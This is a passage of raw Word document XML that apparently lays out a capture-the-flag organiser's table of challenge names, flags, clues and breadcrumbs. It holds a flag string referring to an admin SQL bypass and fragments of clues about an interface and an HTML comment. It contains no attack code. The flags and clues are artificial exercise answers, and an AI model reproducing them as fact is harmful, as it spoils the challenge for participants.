          <v:group id="_x0000_s1063" style="position:absolute;margin-left:374.8pt;margin-top:557.95pt;width:200.8pt;height:54.65pt;z-index:-1873;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="7496,11159" coordsize="4016,1093">
            <v:shape id="_x0000_s1067" style="position:absolute;left:7506;top:11169;width:3996;height:269" coordorigin="7506,11169" coordsize="3996,269" path="m7506,11437r3997,l11503,11169r-3997,l7506,11437xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1066" style="position:absolute;left:7506;top:11437;width:3996;height:269" coordorigin="7506,11437" coordsize="3996,269" path="m7506,11706r3997,l11503,11437r-3997,l7506,11706xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1065" style="position:absolute;left:7506;top:11706;width:3996;height:266" coordorigin="7506,11706" coordsize="3996,266" path="m7506,11973r3997,l11503,11706r-3997,l7506,11973xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1064" style="position:absolute;left:7506;top:11973;width:3996;height:269" coordorigin="7506,11973" coordsize="3996,269" path="m7506,12242r3997,l11503,11973r-3997,l7506,12242xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1057" style="position:absolute;margin-left:36.35pt;margin-top:551.2pt;width:51.2pt;height:68.1pt;z-index:-1874;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="727,11024" coordsize="1024,1362">
            <v:shape id="_x0000_s1062" style="position:absolute;left:737;top:11034;width:1004;height:269" coordorigin="737,11034" coordsize="1004,269" path="m737,11303r1003,l1740,11034r-1003,l737,11303xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1061" style="position:absolute;left:737;top:11303;width:1004;height:269" coordorigin="737,11303" coordsize="1004,269" path="m737,11572r1003,l1740,11303r-1003,l737,11572xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1060" style="position:absolute;left:737;top:11572;width:1004;height:266" coordorigin="737,11572" coordsize="1004,266" path="m737,11838r1003,l1740,11572r-1003,l737,11838xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1059" style="position:absolute;left:737;top:11838;width:1004;height:269" coordorigin="737,11838" coordsize="1004,269" path="m737,12108r1003,l1740,11838r-1003,l737,12108xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1058" style="position:absolute;left:737;top:12108;width:1004;height:269" coordorigin="737,12108" coordsize="1004,269" path="m737,12376r1003,l1740,12108r-1003,l737,12376xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1052" style="position:absolute;margin-left:36.35pt;margin-top:481.35pt;width:51.2pt;height:54.75pt;z-index:-1875;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="727,9627" coordsize="1024,1095">
            <v:shape id="_x0000_s1056" style="position:absolute;left:737;top:9637;width:1004;height:269" coordorigin="737,9637" coordsize="1004,269" path="m737,9906r1003,l1740,9637r-1003,l737,9906xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1055" style="position:absolute;left:737;top:9906;width:1004;height:269" coordorigin="737,9906" coordsize="1004,269" path="m737,10175r1003,l1740,9906r-1003,l737,10175xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1054" style="position:absolute;left:737;top:10175;width:1004;height:269" coordorigin="737,10175" coordsize="1004,269" path="m737,10444r1003,l1740,10175r-1003,l737,10444xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1053" style="position:absolute;left:737;top:10444;width:1004;height:269" coordorigin="737,10444" coordsize="1004,269" path="m737,10713r1003,l1740,10444r-1003,l737,10713xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1047" style="position:absolute;margin-left:36.35pt;margin-top:409.35pt;width:51.2pt;height:54.8pt;z-index:-1876;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="727,8187" coordsize="1024,1096">
            <v:shape id="_x0000_s1051" style="position:absolute;left:737;top:8197;width:1004;height:269" coordorigin="737,8197" coordsize="1004,269" path="m737,8466r1003,l1740,8197r-1003,l737,8466xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1050" style="position:absolute;left:737;top:8466;width:1004;height:269" coordorigin="737,8466" coordsize="1004,269" path="m737,8735r1003,l1740,8466r-1003,l737,8735xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1049" style="position:absolute;left:737;top:8735;width:1004;height:269" coordorigin="737,8735" coordsize="1004,269" path="m737,9004r1003,l1740,8735r-1003,l737,9004xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1048" style="position:absolute;left:737;top:9004;width:1004;height:269" coordorigin="737,9004" coordsize="1004,269" path="m737,9273r1003,l1740,9004r-1003,l737,9273xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1042" style="position:absolute;margin-left:243.4pt;margin-top:286.45pt;width:121.6pt;height:54.75pt;z-index:-1877;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="4868,5729" coordsize="2432,1095">
            <v:shape id="_x0000_s1046" style="position:absolute;left:4878;top:5739;width:2412;height:269" coordorigin="4878,5739" coordsize="2412,269" path="m4878,6008r2412,l7290,5739r-2412,l4878,6008xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1045" style="position:absolute;left:4878;top:6008;width:2412;height:269" coordorigin="4878,6008" coordsize="2412,269" path="m4878,6277r2412,l7290,6008r-2412,l4878,6277xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1044" style="position:absolute;left:4878;top:6277;width:2412;height:269" coordorigin="4878,6277" coordsize="2412,269" path="m4878,6546r2412,l7290,6277r-2412,l4878,6546xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1043" style="position:absolute;left:4878;top:6546;width:2412;height:269" coordorigin="4878,6546" coordsize="2412,269" path="m4878,6815r2412,l7290,6546r-2412,l4878,6815xe" fillcolor="#e0d0cc" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1037" style="position:absolute;margin-left:36.35pt;margin-top:286.45pt;width:51.2pt;height:54.75pt;z-index:-1878;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="727,5729" coordsize="1024,1095">
            <v:shape id="_x0000_s1041" style="position:absolute;left:737;top:5739;width:1004;height:269" coordorigin="737,5739" coordsize="1004,269" path="m737,6008r1003,l1740,5739r-1003,l737,6008xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1040" style="position:absolute;left:737;top:6008;width:1004;height:269" coordorigin="737,6008" coordsize="1004,269" path="m737,6277r1003,l1740,6008r-1003,l737,6277xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1039" style="position:absolute;left:737;top:6277;width:1004;height:269" coordorigin="737,6277" coordsize="1004,269" path="m737,6546r1003,l1740,6277r-1003,l737,6546xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1038" style="position:absolute;left:737;top:6546;width:1004;height:269" coordorigin="737,6546" coordsize="1004,269" path="m737,6815r1003,l1740,6546r-1003,l737,6815xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1031" style="position:absolute;margin-left:36.35pt;margin-top:206.65pt;width:51.2pt;height:68.25pt;z-index:-1879;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="727,4133" coordsize="1024,1365">
            <v:shape id="_x0000_s1036" style="position:absolute;left:737;top:4143;width:1004;height:269" coordorigin="737,4143" coordsize="1004,269" path="m737,4412r1003,l1740,4143r-1003,l737,4412xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1035" style="position:absolute;left:737;top:4412;width:1004;height:269" coordorigin="737,4412" coordsize="1004,269" path="m737,4680r1003,l1740,4412r-1003,l737,4680xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1034" style="position:absolute;left:737;top:4680;width:1004;height:269" coordorigin="737,4680" coordsize="1004,269" path="m737,4949r1003,l1740,4680r-1003,l737,4949xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1033" style="position:absolute;left:737;top:4949;width:1004;height:269" coordorigin="737,4949" coordsize="1004,269" path="m737,5219r1003,l1740,4949r-1003,l737,5219xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1032" style="position:absolute;left:737;top:5219;width:1004;height:269" coordorigin="737,5219" coordsize="1004,269" path="m737,5487r1003,l1740,5219r-1003,l737,5487xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1026" style="position:absolute;margin-left:36.35pt;margin-top:140.3pt;width:51.2pt;height:54.65pt;z-index:-1880;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordorigin="727,2806" coordsize="1024,1093">
            <v:shape id="_x0000_s1030" style="position:absolute;left:737;top:2816;width:1004;height:269" coordorigin="737,2816" coordsize="1004,269" path="m737,3084r1003,l1740,2816r-1003,l737,3084xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1029" style="position:absolute;left:737;top:3084;width:1004;height:269" coordorigin="737,3084" coordsize="1004,269" path="m737,3353r1003,l1740,3084r-1003,l737,3353xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1028" style="position:absolute;left:737;top:3353;width:1004;height:266" coordorigin="737,3353" coordsize="1004,266" path="m737,3620r1003,l1740,3353r-1003,l737,3620xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1027" style="position:absolute;left:737;top:3620;width:1004;height:269" coordorigin="737,3620" coordsize="1004,269" path="m737,3888r1003,l1740,3620r-1003,l737,3888xe" fillcolor="#b58a80" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="6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12"/>
        <w:gridCol w:w="5550"/>
        <w:gridCol w:w="4208"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="526"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1097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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="3" w:line="120" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="12"/>
                <w:szCs w:val="12"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="298"/>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Na</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>e                          Fl</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">g                                     </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="56"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">Clue                                         </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="53"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>B</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>read</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>ru</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>b</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="1394"/>
        </w:trPr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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="129" w:right="139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color w:val="252525"/>
                <w:spacing w:val="-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ag</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525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 xml:space="preserve">– </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Po</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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t A</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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th</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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rit</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>y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 xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing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lea</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-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e!</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="975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0D0CC"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:line="160" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="3041" w:right="4329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color w:val="252525"/>
                <w:spacing w:val="-1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eck</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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color w:val="252525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252525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est</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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in</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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erfa</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2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color w:val="252525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--</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:before="2" w:line="340" w:lineRule="exact"/>
              <w:ind w:left="266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252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>{admin_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>el</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>sq</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">_bypass}              </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="47"/>
                <w:position w:val="-6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252525"/>
                <w:position w:val="8"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>sl</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="8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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="8"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>pp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="8"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="8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252525"/>
                <w:position w:val="8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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="8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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="8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color w:val="252525"/>
                <w:position w:val="8"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">s </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="8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color w:val="252525"/>
                <w:position w:val="8"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ea</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="8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color w:val="252525"/>
                <w:position w:val="8"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">e                   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="5"/>
                <w:position w:val="8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252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>&lt;!-- T</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6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252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
